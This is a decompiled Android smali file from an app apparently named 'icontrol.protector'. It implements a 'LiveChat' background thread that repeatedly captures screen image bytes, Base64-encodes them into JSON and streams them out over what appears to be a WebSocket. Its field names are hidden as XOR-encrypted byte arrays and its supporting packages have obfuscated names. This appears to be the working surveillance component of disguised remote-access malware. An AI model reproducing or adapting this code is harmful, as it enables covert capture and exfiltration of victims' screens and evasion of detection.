.class Lcom/icontrol/protector/LiveChat$e$a;
.super Ljava/lang/Thread;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/LiveChat$e;->f(Lntidisestablish/neumonoul/floccinaucinih/m70;Lntidisestablish/neumonoul/floccinaucinih/dy;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Lntidisestablish/neumonoul/floccinaucinih/m70;

.field final synthetic f:Lcom/icontrol/protector/LiveChat$e;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/LiveChat$e;Lntidisestablish/neumonoul/floccinaucinih/m70;)V
    .locals 0

    .line 1
    iput-object p1, p0, Lcom/icontrol/protector/LiveChat$e$a;->f:Lcom/icontrol/protector/LiveChat$e;

    iput-object p2, p0, Lcom/icontrol/protector/LiveChat$e$a;->e:Lntidisestablish/neumonoul/floccinaucinih/m70;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 11

    const-wide/16 v0, 0x1

    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    iget-object v0, p0, Lcom/icontrol/protector/LiveChat$e$a;->f:Lcom/icontrol/protector/LiveChat$e;

    iget-object v0, v0, Lcom/icontrol/protector/LiveChat$e;->a:Landroid/content/Context;

    const/4 v1, 0x4

    new-array v2, v1, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/4 v4, 0x3

    new-array v5, v4, [B

    fill-array-data v5, :array_2

    new-array v6, v3, [B

    fill-array-data v6, :array_3

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {v0, v2, v5}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v2, p0, Lcom/icontrol/protector/LiveChat$e$a;->f:Lcom/icontrol/protector/LiveChat$e;

    iget-object v2, v2, Lcom/icontrol/protector/LiveChat$e;->a:Landroid/content/Context;

    new-array v5, v1, [B

    fill-array-data v5, :array_4

    new-array v6, v3, [B

    fill-array-data v6, :array_5

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    new-array v6, v1, [B

    fill-array-data v6, :array_6

    new-array v7, v3, [B

    fill-array-data v7, :array_7

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-static {v2, v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    :cond_0
    :goto_0
    iget-object v5, p0, Lcom/icontrol/protector/LiveChat$e$a;->f:Lcom/icontrol/protector/LiveChat$e;

    iget-object v5, v5, Lcom/icontrol/protector/LiveChat$e;->a:Landroid/content/Context;

    sget-object v6, Lntidisestablish/neumonoul/floccinaucinih/ab;->T:Ljava/lang/String;

    sget-object v7, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v5, v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_1

    :try_start_1
    invoke-static {}, Lcom/icontrol/protector/a;->A()[B

    move-result-object v5

    if-eqz v5, :cond_0

    const/4 v6, 0x0

    invoke-static {v5, v6}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v5

    new-instance v7, Lorg/json/JSONObject;

    invoke-direct {v7}, Lorg/json/JSONObject;-><init>()V

    new-array v8, v1, [B

    fill-array-data v8, :array_8

    new-array v9, v3, [B

    fill-array-data v9, :array_9

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x6

    new-array v9, v9, [B

    fill-array-data v9, :array_a

    new-array v10, v3, [B

    fill-array-data v10, :array_b

    invoke-static {v9, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v8, v4, [B

    fill-array-data v8, :array_c

    new-array v9, v3, [B

    fill-array-data v9, :array_d

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v5, v1, [B

    fill-array-data v5, :array_e

    new-array v8, v3, [B

    fill-array-data v8, :array_f

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    const/4 v8, 0x1

    new-array v9, v8, [B

    const/16 v10, -0x43

    aput-byte v10, v9, v6

    new-array v10, v3, [B

    fill-array-data v10, :array_10

    invoke-static {v9, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v5, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v5, v1, [B

    fill-array-data v5, :array_11

    new-array v9, v3, [B

    fill-array-data v9, :array_12

    invoke-static {v5, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    new-array v8, v8, [B

    const/16 v9, -0x68

    aput-byte v9, v8, v6

    new-array v6, v3, [B

    fill-array-data v6, :array_13

    invoke-static {v8, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v7, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v5, v1, [B

    fill-array-data v5, :array_14

    new-array v6, v3, [B

    fill-array-data v6, :array_15

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v5, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v5, v1, [B

    fill-array-data v5, :array_16

    new-array v6, v3, [B

    fill-array-data v6, :array_17

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v5, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v7}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lcom/icontrol/protector/LiveChat$e$a;->f:Lcom/icontrol/protector/LiveChat$e;

    iget-object v7, v6, Lcom/icontrol/protector/LiveChat$e;->a:Landroid/content/Context;

    iget-object v6, v6, Lcom/icontrol/protector/LiveChat$e;->b:Ljava/lang/String;

    invoke-static {v7, v6, v5}, Lcom/icontrol/protector/LiveChat;->n(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lcom/icontrol/protector/LiveChat$e$a;->e:Lntidisestablish/neumonoul/floccinaucinih/m70;

    invoke-interface {v6, v5}, Lntidisestablish/neumonoul/floccinaucinih/m70;->e(Ljava/lang/String;)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto/16 :goto_0

    :catch_1
    move-exception v5

    invoke-virtual {v5}, Ljava/lang/Throwable;->printStackTrace()V

    goto/16 :goto_0

    :cond_1
    iget-object v0, p0, Lcom/icontrol/protector/LiveChat$e$a;->e:Lntidisestablish/neumonoul/floccinaucinih/m70;

    const/16 v1, 0xf

    new-array v1, v1, [B

    fill-array-data v1, :array_18

    new-array v2, v3, [B

    fill-array-data v2, :array_19

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/16 v2, 0x3e8

    invoke-interface {v0, v2, v1}, Lntidisestablish/neumonoul/floccinaucinih/m70;->b(ILjava/lang/String;)Z

    return-void

    :array_0
    .array-data 1
        0x3ct
        -0x6dt
        -0x26t
        -0x4bt
    .end array-data

    :array_1
    .array-data 1
        0x6bt
        -0x20t
        -0x47t
        -0x39t
        0x4et
        0x5at
        0x58t
        -0x34t
    .end array-data

    :array_2
    .array-data 1
        0x4et
        0x21t
        -0x64t
    .end array-data

    :array_3
    .array-data 1
        0x79t
        0x13t
        -0x54t
        -0x9t
        -0x19t
        0x32t
        0x15t
        -0x9t
    .end array-data

    :array_4
    .array-data 1
        0x55t
        -0x27t
        0x5bt
        0x31t
    .end array-data

    :array_5
    .array-data 1
        0x1dt
        -0x56t
        0x38t
        0x43t
        -0x36t
        0x5ft
        0xat
        0x7dt
    .end array-data

    :array_6
    .array-data 1
        -0x20t
        0x7et
        -0x3bt
        0x1ft
    .end array-data

    :array_7
    .array-data 1
        -0x2ft
        0x4ct
        -0x3t
        0x2ft
        0x5bt
        -0x43t
        -0x5t
        -0x3at
    .end array-data

    :array_8
    .array-data 1
        -0x1t
        0x3at
        0x47t
        0x3bt
    .end array-data

    :array_9
    .array-data 1
        -0x75t
        0x43t
        0x37t
        0x5et
        -0x27t
        0x20t
        -0x6ct
        -0x2at
    .end array-data

    :array_a
    .array-data 1
        0x53t
        0xct
        -0x4t
        -0x18t
        -0x44t
        -0x62t
    .end array-data

    nop

    :array_b
    .array-data 1
        0x20t
        0x6ft
        -0x72t
        -0x73t
        -0x23t
        -0x6t
        0x11t
        0x5dt
    .end array-data

    :array_c
    .array-data 1
        0x54t
        0x23t
        0xdt
    .end array-data

    :array_d
    .array-data 1
        0x3dt
        0x4et
        0x6at
        0x6dt
        -0x26t
        0xft
        -0x39t
        0x5at
    .end array-data

    :array_e
    .array-data 1
        0x47t
        0x7at
        -0x68t
        -0x67t
    .end array-data

    :array_f
    .array-data 1
        0x21t
        0x8t
        -0xbt
        -0x13t
        -0x6ct
        0x25t
        -0x7at
        0x7et
    .end array-data

    :array_10
    .array-data 1
        -0x36t
        0x25t
        -0x35t
        0x2ct
        0x3et
        0x6at
        0x4ft
        -0x24t
    .end array-data

    :array_11
    .array-data 1
        -0x3dt
        0x62t
        0x3ct
        0x6ct
    .end array-data

    :array_12
    .array-data 1
        -0x50t
        0x9t
        0x50t
        0x15t
        0x2t
        -0x6at
        -0x3t
        -0x6dt
    .end array-data

    :array_13
    .array-data 1
        -0x58t
        -0x19t
        0x5dt
        -0xct
        -0x38t
        -0x4et
        -0x36t
        0x16t
    .end array-data

    :array_14
    .array-data 1
        -0x67t
        -0x72t
        0x20t
        -0x67t
    .end array-data

    :array_15
    .array-data 1
        -0x12t
        -0x1dt
        0x4ft
        -0x5t
        -0x46t
        0xbt
        0x7ct
        -0x79t
    .end array-data

    :array_16
    .array-data 1
        -0x3dt
        -0x28t
        0x16t
        0x63t
    .end array-data

    :array_17
    .array-data 1
        -0x55t
        -0x4bt
        0x79t
        0x1t
        -0x49t
        0xct
        -0x40t
        -0x7ct
    .end array-data

    :array_18
    .array-data 1
        0x0t
        -0x13t
        -0x15t
        -0x28t
        0x20t
        0x5ct
        0x5at
        -0xft
        0x1ct
        -0x1dt
        -0x17t
        -0x2ft
        0x24t
        0x4ct
        0x1ft
    .end array-data

    :array_19
    .array-data 1
        0x73t
        -0x72t
        -0x67t
        -0x43t
        0x41t
        0x38t
        0x7at
        -0x6et
    .end array-data
.end method
